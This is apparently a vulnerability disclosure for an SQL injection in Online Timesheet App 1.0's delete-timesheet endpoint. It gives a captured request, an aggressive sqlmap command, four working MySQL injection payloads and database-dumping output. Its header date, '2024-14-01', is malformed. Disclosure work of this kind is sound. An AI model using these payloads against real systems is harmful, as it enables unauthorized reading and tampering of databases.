# Online_Timesheet_App_SQL_Injection

+ **Exploit Title:** Online_Timesheet_App_SQL_Injection
+ **Date:** 2024-14-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17106/online-timesheet-app-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17106&title=Online+Timesheet+App+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux  + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
Online Timesheet App 1.0 allows SQL Injection via parameter 'timesheet' in "/online-timesheet/endpoint/delete-timesheet.php?timesheet=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to : "http://localhost/online-timesheet/"
+ Select a random timesheet (if you don't have one, you can create one yourself and try it) 
+ Press the Delete timesheet button. 
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /online-timesheet/endpoint/delete-timesheet.php?timesheet=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'ID' parameter to dump the database.
```
sqlmap -r r.txt -p timesheet --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
Parameter: timesheet (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: timesheet=1' RLIKE (SELECT (CASE WHEN (2289=2289) THEN 1 ELSE 0x28 END))-- FHEq

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: timesheet=1' AND EXTRACTVALUE(6634,CONCAT(0x5c,0x716a7a7a71,(SELECT (ELT(6634=6634,1))),0x71767a6b71))-- IGPz

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: timesheet=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: timesheet=1' AND (SELECT 2009 FROM (SELECT(SLEEP(5)))PVTr)-- uBga
---
[16:37:55] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[16:37:55] [INFO] fetching current database
[16:37:55] [INFO] retrieved: 'timesheet_db'
current database: 'timesheet_db'
```
+ current database: `timesheet_db`
![Ekran görüntüsü 2024-01-14 004327](https://github.com/BurakSevben/Online_Timesheet_App_SQL_Injection/assets/117217689/b66ab948-ab3e-49d7-8244-c7a8a661de13)





